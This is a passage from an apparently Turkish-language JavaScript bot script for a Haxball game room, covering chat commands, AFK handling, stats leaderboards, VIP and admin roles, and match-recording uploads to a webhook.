    // 'INSERT_MASTER_AUTH_HERE',
    // 'INSERT_MASTER_AUTH_HERE_2'
];

/* COMMANDS */

var commands = {
    annayinaminagoyam: {
        aliases: ['hayaminiaminakoyam'],
        roles: Role.PLAYER,
        desc: `
	Bu komut, mevcut tüm komutları gösterir. Ayrıca bir komutun açıklamasını da gösterebilir.
Örnek: \'!help bb\' \'bb\' komutunun açıklamasını gösterecektir.`,
        function: helpCommand,
    },
    help: {
        aliases: ['komutlar'],
        roles: Role.PLAYER,
        desc: `
	Bu komut, mevcut tüm komutları gösterir. Ayrıca bir komutun açıklamasını da gösterebilir.
Örnek: \'!help bb\' \'bb\' komutunun açıklamasını gösterecektir.`,
        function: helpkrsm,
    },
    claim: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: masterCommand,
    },
    afk: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        This command makes you go AFK.
    Kısıtlamalar: Minimum 1 dakika AFK süresi, maksimum 5 dakika ve 10 dakika bekleme süresi.`,
        function: afkCommand,
    },
    afks: {
        aliases: ['afklist'],
        roles: Role.PLAYER,
        desc: `
        Bu komut AFK olan tüm oyuncuları gösterir.`,
        function: afkListCommand,
    },
    bb: {
        aliases: ['bye', 'gn', 'cya'],
        roles: Role.PLAYER,
        desc: `
	Bu komut anında ayrılmanızı sağlar (önerileni kullanın).`,
        function: leaveCommand,
    },
    sldkhf34odo3ı4d4o4t: {
        aliases: ['yavsgoc'],
        roles: Role.PLAYER,
        desc: `
        Bu komut odadaki genel istatistiklerinizi gösterir.`,
        function: globalStatsCommand,
    },
    rename: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut, lider tablosu için kendinizi yeniden adlandırmanıza olanak tanır.`,
        function: renameCommand,
    },
    oyunlar: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut, odada en çok oyuna sahip ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    galibiyet: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut, odada en çok galibiyet alan ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    kj23hd5k34: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut, odada en çok gol atan ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    h34kdt43t: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut, odada en fazla asist yapan ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    lkl34l: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut odada en fazla CS'ye sahip ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    oynamasüresi: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Bu komut odada en çok süre oynayan ilk 5 oyuncuyu gösterir.`,
        function: statsLeaderboardCommand,
    },
    training: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
        Bu komut klasik antrenman stadyumunu açar.`,
        function: stadiumCommand,
    },
    classic: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
        Bu komut klasik stadyumu açar.`,
        function: stadiumCommand,
    },
    big: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
        Bu komut klasik stadyumu yükler.`,
        function: stadiumCommand,
    },
    rr: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut oyunu yeniden başlatır.`,
        function: restartCommand,
    },
    rrs: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut takımları değiştirir ve oyunu yeniden başlatır.`,
        function: restartSwapCommand,
    },
    kayıt: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut kayıt olmaya yarar, istatistikleriniz kayıt olsun istiyorsanız kayıt olun.`,
        function: KayıtCommand,
    },
    skorum: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut skorunuzu görmeye yarar.`,
        function: SkoreCommand,
    },
    puan: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut skorunuzu görmeye yarar.`,
        function: puaneCommand,
    },
    sıram: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut skorunuzu görmeye yarar.`,
        function: sıraneCommand,
    },
    rank: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut skorunuzu görmeye yarar.`,
        function: rankeCommand,
    },
    rankhelp: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut rankı görmeye yarar.`,
        function: rankehelpeehCommand,
    },
    giriş: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut giriş yapmanıza yarar, istatistikleriniz kayıt olsun istiyorsanız giriş yapın.`,
        function: GirişCommand,
    },
    şifremideğiştir: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut şifrenizi değiştirmeye yarar.`,
        function: Sifredegistirlen,
    },
    power: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut power haritası oylamanıza yarar.`,
        function: PowerCommand,
    },
    futsal: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut futsal haritası oylamanıza yarar.`,
        function: NormalCommand,
    },
    büyükol: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin boyutunu büyütmeye yarar.`,
        function: buyukolCommand,
    },
    küçükol: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin boyutunu küçültmeye yarar.`,
        function: kucukolCommand,
    },
    vip: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİP komutlarını gösterir.`,
        function: vipcommandCommand,
    },
    parti: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin odada parti modunu açmasını sağlar.`,
        function: avatarpartyCommand,
    },
    topparti: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin topun rengini sürekli olarak değiştirmesini sağlar.`,
        function: ballpartyCommand,
    },
    viprengi: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin chat rengini değiştirmesini sağlar.`,
        function: viprengidegisCommand,
    },
    toprengi: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPlerin topun rengini belirlemesini sağlar.`,
        function: toprengidegisCommand,
    },
    görünmezol: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut VİPleri görünmez yapar.`,
        function: gorunmezolCommand,
    },
    vipşifresi: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
    Bu komut VİP şifresi değiştirmenizi sağlar.`,
        function: VipşifredeğiştirCommand,
    },
    viplerisil: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
    Bu komut VİP listesindeki herkesi VİPden atar.`,
        function: VipdeleteCommand,
    },
    vipekle: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
    Bu komut oyuncuya VİP vermeye yarar !vipekle (İD).`,
        function: VipekleCommand,
    },
    vipsil: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
    Bu komut oyuncunun VİP yetkisini alır !vipsil (İD).`,
        function: VipinialCommand,
    },
    adminrengi: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
    Bu komut adminlerin chat rengini değiştirir.`,
        function: AdminRengideğiştirCommand,
    },
    admin: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut odaya admin çağırmanızı sağlar, (gereksiz kullanan banlanır).`,
        function: AdminlereBilgiGecildiCommand,
    },
    oyla: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut maç bitiminde takım kaptanı oylamanız için kullanılır.`,
        function: OylaCommand,
    },
    aday: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut maç bitiminde takım kaptanı adayı olmanız için kullanılır.`,
        function: KaptanCommand,
    },
    dc: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
    Bu komut Discord sunucumuzun linkini göstermek için kullanılır.`,
        function: discordCommand,
    },
    swap: {
        aliases: ['s'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, oyun durdurulduğunda takımları değiştirir.`,
        function: swapCommand,
    },
    susun: {
        aliases: ['s'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, Adminlerin chati kapatmasını sağlar.`,
        function: susunCommand,
    },
    konuşun: {
        aliases: ['s'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, Adminlerin chati açmasını sağlar.`,
        function: konuşunCommand,
    },
    kickred: {
        aliases: ['kickr'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, komutu giren oyuncu da dahil olmak üzere kırmızı takımdaki tüm oyuncuları atar. Kick nedenini argüman olarak verebilirsiniz.`,
        function: kickTeamCommand,
    },
    kickblue: {
        aliases: ['kickb'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, komutu giren oyuncu da dahil olmak üzere mavi takımdaki tüm oyuncuları atar. Kick sebebini argüman olarak sunabilirsiniz.`,
        function: kickTeamCommand,
    },
    kickspec: {
        aliases: ['kicks'],
        roles: Role.ADMIN_TEMP,
        desc: `
    Bu komut, komutu giren oyuncu da dahil olmak üzere specteki tüm oyuncuları atar. Kick nedenini argüman olarak verebilirsiniz.`,
        function: kickTeamCommand,
    },
    mute: {
        aliases: ['m'],
        roles: Role.ADMIN_TEMP,
        desc: `
        'mute' komutu:

         Bu komut bir susturmanıza olanak tanır. Belirli bir süre boyunca konuşamayacak ve herhangi bir zamanda yöneticiler tarafından sesi kapatılabilir.
     2 argüman alır:
     Bağımsız Değişken 1: #<id> burada <id>, hedeflenen oyuncunun kimliğidir. Oyuncu yönetici ise bu işe yaramaz.
     Bağımsız Değişken 2 (isteğe bağlı): <süre> burada <süre> dakika cinsinden sessize alma süresidir. Hiçbir değer sağlanmazsa, sessize alma işlemi varsayılan süre olan tanımlanmamış dakika kadar sürer.
     Örnek: !mute #3 20, kimliği 3 olan oyuncuyu 20 dakika boyunca sessize alacaktır..`,
        function: muteCommand,
    },
    unmute: {
        aliases: ['um'],
        roles: Role.ADMIN_TEMP,
        desc: `
        Bu komut birinin sesini açmanıza olanak tanır.
     1 argüman alır:
     Bağımsız Değişken 1: #<id> burada <id>, sesi kapatılan oyuncunun kimliğidir.
     VEYA
     Bağımsız Değişken 1: <sayı> burada <sayı>, 'muteList' komutu tarafından verilen sessize alma ile ilişkili sayıdır.
     Örnek: !unmute #300, id 300'e sahip oyuncunun sesini açar,
              !unmute 8, 'muteList' komutuna göre n°8 oynatıcının sesini açacaktır.' command.`,
        function: unmuteCommand,
    },
    mutes: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
        Bu komut susturulanlar listesini gösterir.`,
        function: muteListCommand,
    },
    clearbans: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
	Bu komut herkesin yasağını kaldırır. Ayrıca, kimliğini argüman olarak ekleyerek, özellikle bir oyuncunun yasağını kaldırabilir.`,
        function: clearbansCommand,
    },
    bans: {
        aliases: ['banlist'],
        roles: Role.MASTER,
        desc: `
    Bu komut yasaklanan tüm oyuncuları ve IDlerini gösterir.`,
        function: banListCommand,
    },
    admins: {
        aliases: ['adminlist'],
        roles: Role.MASTER,
        desc: `
    Bu komut admin olan tüm oyuncuları gösterir.`,
        function: adminListCommand,
    },
    adminver: {
        aliases: ['admin'],
        roles: Role.MASTER,
        desc: `
    Bu komut birisinin yönetici olarak ayarlanmasına izin verir. Yönetici olarak bağlanabilecek ve ustalar tarafından istenildiği zaman kaldırılabilecektir.
1 argüman alır:
Bağımsız Değişken 1: #<id> burada <id>, hedeflenen oyuncunun kimliğidir.
Örnek: !setadmin #3, id 3'e sahip oyuncuya admin verecektir.`,
        function: setAdminCommand,
    },
    adminal: {
        aliases: ['unadmin'],
        roles: Role.MASTER,
        desc: `
	Bu komut bir kişinin yönetici olarak kaldırılmasına olanak tanır.
1 argüman alır:
Bağımsız Değişken 1: #<id> burada <id>, hedeflenen oyuncunun kimliğidir.
VEYA
Bağımsız Değişken 1: <sayı> burada <sayı>, 'admins' komutu tarafından verilen yöneticiyle ilişkili sayıdır.
Örnek: !removeadmin #300, kimliği 300 olan oynatıcının yöneticiliğini kaldıracaktır,
          !removeadmin 2, 'admins' komutuna göre admin n°2'yi kaldıracaktır.`,
        function: removeAdminCommand,
    },
    password: {
        aliases: ['pw'],
        roles: Role.MASTER,
        desc: `
        Bu komut odaya bir şifre eklemenizi sağlar.
1 argüman alır:
    Bağımsız Değişken 1: <password> burada <password> oda için istediğiniz şifredir.
    
    Oda şifresini kaldırmak için '!password' girmeniz yeterlidir.`,
        function: passwordCommand,
    },
};

/* GAME */

var lastTouches = Array(2).fill(null);
var lastTeamTouched;

var speedCoefficient = 100 / (5 * (0.99 ** 60 + 1));
var ballSpeed = 0;
var playerRadius = 15;
var ballRadius = 10;

var triggerDistance = playerRadius + ballRadius + 0.01;

/* COLORS */

var welcomeColor = 0xc4ff65;
var announcementColor = 0xffefd6;
var infoColor = 0xbebebe;
var privateMessageColor = 0xffc933;
var redColor = 0xff4c4c;
var blueColor = 0x62cbff;
var warningColor = 0xffa135;
var errorColor = 0xa40000;
var successColor = 0x75ff75;
var defaultColor = null;

/* AUXILIARY */

var checkTimeVariable = false;
var checkStadiumVariable = true;
var endGameVariable = false;
var cancelGameVariable = false;
var kickFetchVariable = false;

var chooseMode = false;
var timeOutCap;
var capLeft = false;
var redCaptainChoice = '';
var blueCaptainChoice = '';
var chooseTime = 8;

var AFKSet = new Set();
var AFKMinSet = new Set();
var AFKCooldownSet = new Set();
var minAFKDuration = 0;
var maxAFKDuration = 30;
var AFKCooldown = 0;

var muteArray = new MuteList();
var muteDuration = 5;

var removingPlayers = false;
var insertingPlayers = false;

var stopTimeout;
var startTimeout;
var unpauseTimeout;
var removingTimeout;
var insertingTimeout;

var emptyPlayer = {
    id: 0,
};
stadiumCommand(emptyPlayer, "!training");

var game = new Game();

/* FUNCTIONS */

/* AUXILIARY FUNCTIONS */

if (typeof String.prototype.replaceAll != 'function') {
    String.prototype.replaceAll = function (search, replacement) {
        var target = this;
        return target.split(search).join(replacement);
    };
}

function getDate() {
    let d = new Date();
    return d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
}

/* MATH FUNCTIONS */

function getRandomInt(max) {
    // returns a random number between 0 and max-1
    return Math.floor(Math.random() * Math.floor(max));
}

function pointDistance(p1, p2) {
    if (p1 && p2 && p1.x !== undefined && p1.y !== undefined && p2.x !== undefined && p2.y !== undefined) {
        var d1 = p1.x - p2.x;
        var d2 = p1.y - p2.y;
        return Math.sqrt(d1 * d1 + d2 * d2);
    } else {
        console.log("Geçersiz nokta bilgisi!");
        return "Geçersiz nokta bilgisi!";
    }
}

/* TIME FUNCTIONS */

function getHoursStats(time) {
    return Math.floor(time / 3600);
}

function getMinutesGame(time) {
    var t = Math.floor(time / 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getMinutesReport(time) {
    return Math.floor(Math.round(time) / 60);
}

function getMinutesEmbed(time) {
    var t = Math.floor(Math.round(time) / 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getMinutesStats(time) {
    return Math.floor(time / 60) - getHoursStats(time) * 60;
}

function getSecondsGame(time) {
    var t = Math.floor(time - Math.floor(time / 60) * 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getSecondsReport(time) {
    var t = Math.round(time);
    return Math.floor(t - getMinutesReport(t) * 60);
}

function getSecondsEmbed(time) {
    var t = Math.round(time);
    var t2 = Math.floor(t - Math.floor(t / 60) * 60);
    return `${Math.floor(t2 / 10)}${Math.floor(t2 % 10)}`;
}

function getTimeGame(time) {
    return `[${getMinutesGame(time)}:${getSecondsGame(time)}]`;
}

function getTimeEmbed(time) {
    return `[${getMinutesEmbed(time)}:${getSecondsEmbed(time)}]`;
}

function getTimeStats(time) {
    if (getHoursStats(time) > 0) {
        return `${getHoursStats(time)}h${getMinutesStats(time)}m`;
    } else {
        return `${getMinutesStats(time)}m`;
    }
}

function getGoalGame() {
    return game.scores.red + game.scores.blue;
}

/* REPORT FUNCTIONS */

function findFirstNumberCharString(str) {
    let str_number = str[str.search(/[0-9]/g)];
    return str_number === undefined ? "0" : str_number;
}

function getIdReport() {
    var d = new Date();
    return `${d.getFullYear() % 100}${d.getMonth() < 9 ? '0' : ''}${d.getMonth() + 1}${d.getDate() < 10 ? '0' : ''}${d.getDate()}${d.getHours() < 10 ? '0' : ''}${d.getHours()}${d.getMinutes() < 10 ? '0' : ''}${d.getMinutes()}${d.getSeconds() < 10 ? '0' : ''}${d.getSeconds()}${findFirstNumberCharString(roomName)}`;
}

function getRecordingName(game) {
    let d = new Date();
    let redCap = game.playerComp[0][0] != undefined ? game.playerComp[0][0].player.name : 'Red';
    let blueCap = game.playerComp[1][0] != undefined ? game.playerComp[1][0].player.name : 'Blue';
    let day = d.getDate() < 10 ? '0' + d.getDate() : d.getDate();
    let month = d.getMonth() < 10 ? '0' + (d.getMonth() + 1) : (d.getMonth() + 1);
    let year = d.getFullYear() % 100 < 10 ? '0' + (d.getFullYear() % 100) : (d.getFullYear() % 100);
    let hour = d.getHours() < 10 ? '0' + d.getHours() : d.getHours();
    let minute = d.getMinutes() < 10 ? '0' + d.getMinutes() : d.getMinutes();
    return `${day}-${month}-${year}-${hour}h${minute}-${redCap}vs${blueCap}.hbr2`;
}

function fetchRecording(game) {
    if (gameWebhook != "") {
        let form = new FormData();
        form.append(null, new File([game.rec], getRecordingName(game), { "type": "text/plain" }));
        form.append("payload_json", JSON.stringify({
            "username": roomName
        }));

        fetch(gameWebhook, {
            method: 'POST',
            body: form,
        }).then((res) => res);
    }
}

/* FEATURE FUNCTIONS */

function getCommand(commandStr) {
    if (commands.hasOwnProperty(commandStr)) return commandStr;
    for (const [key, value] of Object.entries(commands)) {
        for (let alias of value.aliases) {
            if (alias == commandStr) return key;
        }
    }
    return false;
}

function getPlayerComp(player) {
    if (player == null || player.id == 0) return null;
    var comp = game.playerComp;
    var index = comp[0].findIndex((c) => c.auth == authArray[player.id][0]);
    if (index != -1) return comp[0][index];
    index = comp[1].findIndex((c) => c.auth == authArray[player.id][0]);
    if (index != -1) return comp[1][index];
    return null;
}

function getTeamArray(team, includeAFK = true) {
    if (team == Team.RED) return teamRed;
    if (team == Team.BLUE) return teamBlue;
    if (includeAFK) {
      return playersAll.filter((p) => p.team === Team.SPECTATORS);
    }
    return teamSpec;
}

function sendAnnouncementTeam(message, team, color, style, mention) {
    for (let player of team) {
        room.sendAnnouncement(message, player.id, color, style, mention);
    }
}

function teamChat(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    var emoji = player.team == Team.RED ? '🔴' : player.team == Team.BLUE ? '🔵' : '⚪';
    var message = `${emoji} [TAKIM] ${player.name}: ${msgArray.join(' ')}`;
    var team = getTeamArray(player.team, true);
    var color = player.team == Team.RED ? redColor : player.team == Team.BLUE ? blueColor : null;
    var style = 'bold';
    var mention = HaxNotification.CHAT;
    sendAnnouncementTeam(message, team, color, style, mention);
}

function playerChat(player, message) {
    var msgArray = message.split(/ +/);
    var playerTargetIndex = playersAll.findIndex(
        (p) => p.name.replaceAll(' ', '_') == msgArray[0].substring(2)
    );
    if (playerTargetIndex == -1) {
        room.sendAnnouncement(
            `Invalid player, make sure the name you entered is correct.`,
            player.id,
            errorColor,
            'bold',
            null
        );
        return false;
    }
    var playerTarget = playersAll[playerTargetIndex];
    if (player.id == playerTarget.id) {
        room.sendAnnouncement(
            `You can't send a PM to yourself!`,
            player.id,
            errorColor,
            'bold',
            null
        );
        return false;
    }
    var messageFrom = `📝 [PM with ${playerTarget.name}] ${player.name}: ${msgArray.slice(1).join(' ')}`

    var messageTo = `📝 [PM with ${player.name}] ${player.name}: ${msgArray.slice(1).join(' ')}`

    room.sendAnnouncement(
        messageFrom,
        player.id,
        privateMessageColor,
        'bold',
        HaxNotification.CHAT
    );
    room.sendAnnouncement(
        messageTo,
        playerTarget.id,
        privateMessageColor,
        'bold',
        HaxNotification.CHAT
    );
}

/* PHYSICS FUNCTIONS */

function calculateStadiumVariables() {
    if (checkStadiumVariable && teamRed.length + teamBlue.length > 0) {
        checkStadiumVariable = false;
        setTimeout(() => {
            let ballDisc = room.getDiscProperties(0);
            let playerDisc = room.getPlayerDiscProperties(teamRed.concat(teamBlue)[0].id);
            ballRadius = ballDisc.radius;
            playerRadius = playerDisc.radius;
            triggerDistance = ballRadius + playerRadius + 0.01;
            speedCoefficient = 100 / (5 * ballDisc.invMass * (ballDisc.damping ** 60 + 1));
        }, 1);
    }
}

function checkGoalKickTouch(array, index, goal) {
    if (array != null && array.length >= index + 1) {
        var obj = array[index];
        if (obj != null && obj.goal != null && obj.goal == goal) return obj;
    }
    return null;
}

/* BUTTONS */

function topButton() {
    if (teamSpec.length > 0) {
        if (teamRed.length == teamBlue.length && teamSpec.length > 1) {
            room.setPlayerTeam(teamSpec[0].id, Team.RED);
            room.setPlayerTeam(teamSpec[1].id, Team.BLUE);
        } else if (teamRed.length < teamBlue.length)
            room.setPlayerTeam(teamSpec[0].id, Team.RED);
        else room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
    }
}

function randomButton() {
    if (teamSpec.length > 0) {
        if (teamRed.length == teamBlue.length && teamSpec.length > 1) {
            var r = getRandomInt(teamSpec.length);
            room.setPlayerTeam(teamSpec[r].id, Team.RED);
            teamSpec = teamSpec.filter((spec) => spec.id != teamSpec[r].id);
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.BLUE);
        } else if (teamRed.length < teamBlue.length)
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.RED);
        else
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.BLUE);
    }
}

function blueToSpecButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (var i = 0; i < teamBlue.length; i++) {
        room.setPlayerTeam(teamBlue[teamBlue.length - 1 - i].id, Team.SPECTATORS);
    }
}

function redToSpecButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (var i = 0; i < teamRed.length; i++) {
        room.setPlayerTeam(teamRed[teamRed.length - 1 - i].id, Team.SPECTATORS);
    }
}

function resetButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (let i = 0; i < Math.max(teamRed.length, teamBlue.length); i++) {
        if (Math.max(teamRed.length, teamBlue.length) - teamRed.length - i > 0)
            room.setPlayerTeam(teamBlue[teamBlue.length - 1 - i].id, Team.SPECTATORS);
        else if (Math.max(teamRed.length, teamBlue.length) - teamBlue.length - i > 0)
            room.setPlayerTeam(teamRed[teamRed.length - 1 - i].id, Team.SPECTATORS);
        else break;
    }
    for (let i = 0; i < Math.min(teamRed.length, teamBlue.length); i++) {
        room.setPlayerTeam(
            teamBlue[Math.min(teamRed.length, teamBlue.length) - 1 - i].id,
            Team.SPECTATORS
        );
        room.setPlayerTeam(
            teamRed[Math.min(teamRed.length, teamBlue.length) - 1 - i].id,
            Team.SPECTATORS
        );
    }
}

function swapButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (let player of teamBlue) {
        room.setPlayerTeam(player.id, Team.RED);
    }
    for (let player of teamRed) {
        room.setPlayerTeam(player.id, Team.BLUE);
    }
}

/* COMMAND FUNCTIONS */

/* PLAYER COMMANDS */

function leaveCommand(player, message) {
    room.kickPlayer(player.id, 'Bay bay 👋', false);
}

function helpkrsm(player, message) {
room.sendAnnouncement("📢 Komutlar: !bb, !afk, !afks, !skorum, !puan, !sıram, !rank, !rankhelp, !kayıt(şifre), !giriş(şifre), !şifremideğiştir(şifre), @@nick (mesaj), !vip, !dc, !admin, !adminkomutları", player.id, 0x00FF00);
}

function helpadminamk(player, message) {
room.sendAnnouncement("🔱 Admin Komutları: !mute (id), !unmute (id), !mutelerisil, !susun, !konuşun, !chatsil, !ban (id) (açıklama), \n!kick (id) (açıklama), !banlarısil, !afkkick", player.id, 0x00FF00);
}

function helpCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length == 0) {
        var commandString = 'Komutlar :';
        for (const [key, value] of Object.entries(commands)) {
            if (value.desc && value.roles == Role.PLAYER) commandString += ` !${key},`;
        }
        commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        if (getRole(player) >= Role.ADMIN_TEMP) {
            commandString += `Admin Komutları :`;
            for (const [key, value] of Object.entries(commands)) {
                if (value.desc && value.roles == Role.ADMIN_TEMP) commandString += ` !${key},`;
            }
            if (commandString.slice(commandString.length - 1) == ':')
                commandString += ` None,`;
            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        }
        if (getRole(player) >= Role.MASTER) {
            commandString += `KURUCU Komutları :`;
            for (const [key, value] of Object.entries(commands)) {
                if (value.desc && value.roles == Role.MASTER) commandString += ` !${key},`;
            }
            if (commandString.slice(commandString.length - 1) == ':') commandString += ` None,`;
            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        }
        commandString += "\nBelirli bir komut hakkında bilgi almak için '!help <komut adı> yazın'.";
        room.sendAnnouncement(
            commandString,
            player.id,
            0x18f500,
            'bold',
            HaxNotification.CHAT
        );
    } else if (msgArray.length >= 1) {
        var commandName = getCommand(msgArray[0].toLowerCase());
        if (commandName != false && commands[commandName].desc != false)
            room.sendAnnouncement(
                `\'${commandName}\' command :\n${commands[commandName].desc}`,
                player.id,
                infoColor,
                'bold',
                HaxNotification.CHAT
            );
        else
            room.sendAnnouncement(
                `Bilgi almaya çalıştığınız komut mevcut değil. Mevcut tüm komutları kontrol etmek için \'!help\' yazın.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
    }
}

function globalStatsCommand(player, message) {
    var stats = new HaxStatistics(player.name);
    if (localStorage.getItem(authArray[player.id][0])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id][0]));
    }
    var statsString = printPlayerStats(stats);
    room.sendAnnouncement(
        statsString,
        player.id,
        0x0ed900,
        'bold',
        HaxNotification.CHAT
    );
}

function renameCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (localStorage.getItem(authArray[player.id][0])) {
        var stats = JSON.parse(localStorage.getItem(authArray[player.id][0]));
        if (msgArray.length == 0) {
            stats.playerName = player.name;
        } else {
            stats.playerName = msgArray.join(' ');
        }
        localStorage.setItem(authArray[player.id][0], JSON.stringify(stats));
        room.sendAnnouncement(
            `Kendinizi başarıyla yeniden adlandırdınız ${stats.playerName} !`,
            player.id,
            successColor,
            'bold',
            HaxNotification.CHAT
        );
    } else {
        room.sendAnnouncement(
            `You haven't played a game in this room yet !`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function statsLeaderboardCommand(player, message) {
    var key = message.split(/ +/)[0].substring(1).toLowerCase();
    printRankings(key, player.id);
}

function afkCommand(player, message) {
    if (player.team == Team.SPECTATORS || players.length == 1) {
        if (AFKSet.has(player.id)) {
            if (AFKMinSet.has(player.id)) {
                room.sendAnnouncement(
                    `Minimum ${minAFKDuration} dakikalık AFK süresi vardır. Komutu kötüye kullanmayın!`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else {
                AFKSet.delete(player.id);
                room.sendAnnouncement(
                    `🌅 ${player.name} artık AFK değil!`,
                    null,
                    announcementColor,
                    'bold',
                    null
                );
                updateTeams();
                handlePlayersJoin();
            }
        } else {
            if (AFKCooldownSet.has(player.id)) {
                room.sendAnnouncement(
                    ` Yalnızca ${AFKCooldown} dakikada bir AFK olabilirsiniz, komutu kötüye kullanmayın!`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else {
                AFKSet.add(player.id);
                if (!player.admin) {
                    AFKMinSet.add(player.id);
                    AFKCooldownSet.add(player.id);
                    setTimeout(
                        (id) => {
                            AFKMinSet.delete(id);
                        },
                        minAFKDuration * 60 * 1000,
                        player.id
                    );
                    setTimeout(
                        (id) => {
                            AFKSet.delete(id);
                        },
                        maxAFKDuration * 60 * 1000,
                        player.id
                    );
                    setTimeout(
                        (id) => {
                            AFKCooldownSet.delete(id);
                        },
                        AFKCooldown * 60 * 1000,
                        player.id
                    );
                }
                room.setPlayerTeam(player.id, Team.SPECTATORS);
                room.sendAnnouncement(
                    `😴 ${player.name} Şu an AFK oldu !`,
                    null,
                    announcementColor,
                    'bold',
                    null
                );
                updateTeams();
                handlePlayersLeave();
            }
        }
    } else {
        room.sendAnnouncement(
            `Bir takımdayken AFK olamazsın !`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function afkListCommand(player, message) {
    if (AFKSet.size == 0) {
        room.sendAnnouncement(
            "😴 AFK listesinde kimse yok.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return;
    }
    var cstm = '😴 AFK listesi : ';
    AFKSet.forEach((_, value) => {
        var p = room.getPlayer(value);
        if (p != null) cstm += p.name + `, `;
    });
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(cstm, player.id, announcementColor, 'bold', null);
}

var isKurucuRole = {};

function masterCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (parseInt(msgArray[0]) == masterPassword) {
        if (!masterList.includes(authArray[player.id][0])) {
            room.setPlayerAdmin(player.id, true);
